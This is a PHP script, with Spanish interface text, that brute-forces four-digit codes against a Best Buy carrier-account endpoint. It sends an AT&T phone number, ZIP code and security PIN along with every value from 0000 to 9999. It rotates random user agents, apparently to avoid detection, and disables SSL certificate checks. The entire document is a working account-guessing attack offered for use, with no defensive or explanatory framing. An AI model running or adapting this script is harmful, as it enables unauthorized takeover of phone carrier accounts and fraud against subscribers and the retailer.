<?php 
include 'random-user-agent.php';
$tlf = 'INSERT YOUR NUMBER'; 
$zip = 'INSERT YOUR ZIP'; 
$pin = 'INSERT YOUR PIN'; 
$Url = 'https://www-ssl.bestbuy.com/actdvc/carrieraccount';
$Head = array('Content-Type: application/json','Accept: application/json');

$conteo = '';for($i=0000;$i <= 9999;$i++){if(strlen($i) == 1){$conteo[] = '000'.$i;}elseif(strlen($i) == 2){$conteo[] = '00'.$i;}elseif(strlen($i) == 3){$conteo[] = '0'.$i;}else{$conteo[] = $i;}}

?>
<div style="display:block;text-align:center;padding:20px;">
<h1>Probando con estos datos:</h1>
<code style="background:#4DFF4D;padding:10px;color:#000;">"billingZipCode" => "<?php echo $zip; ?>","secPin" => "<?php echo $pin; ?>","phoneNumber" => "<?php echo $tlf; ?>"</code>
</div>
<br/><br/> 

<?php
$data = json_encode(array("carrierId" => "ATT","billingZipCode" => $zip,"secPin" => $pin,"phoneNumber" => $tlf));

$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, random_user_agent());
curl_setopt($ch, CURLOPT_URL, $Url);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
$getcookie = curl_exec($ch);
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $getcookie, $matches);
curl_close($ch);
$cookies = array();
foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
}
$cok = implode('',$cookies);
$cukis = str_replace("-", "", $cok);

?>

<br/><br/> 

<textarea readonly="readonly" class="form-control" rows="10" cols="62" style="white-space: pre-line;width:100%;" wrap="hard">
<?php


foreach ($conteo as $k => $v){

$data2 = json_encode(array("carrierId" => "ATT","billingZipCode" => $zip,"secPin" => $pin,"phoneNumber" => $tlf,"password" => $v,"s4" => $cukis,"promoCode" => null));
echo $data2."\n"."\n";

$handler = curl_init();
curl_setopt($handler, CURLOPT_HTTPHEADER, $Head);
curl_setopt($handler, CURLOPT_RETURNTRANSFER, true);
curl_setopt($handler, CURLOPT_HEADER, true);
curl_setopt($handler, CURLOPT_USERAGENT, random_user_agent());
curl_setopt($handler, CURLOPT_URL, $Url);
curl_setopt($handler, CURLOPT_POSTFIELDS, $data2);
curl_setopt($handler, CURLOPT_POST, true);
curl_setopt($handler, CURLOPT_SSL_VERIFYPEER, false);
$result = @curl_exec($handler);
curl_close($handler);
//ob_start();
//echo $v."\n"."\n";
print_r ($result);
//echo "\n"."\n";

}			
?>
</textarea>

<p>
<?php echo random_user_agent();
//ob_end_flush(); ?>
</p>

</div>
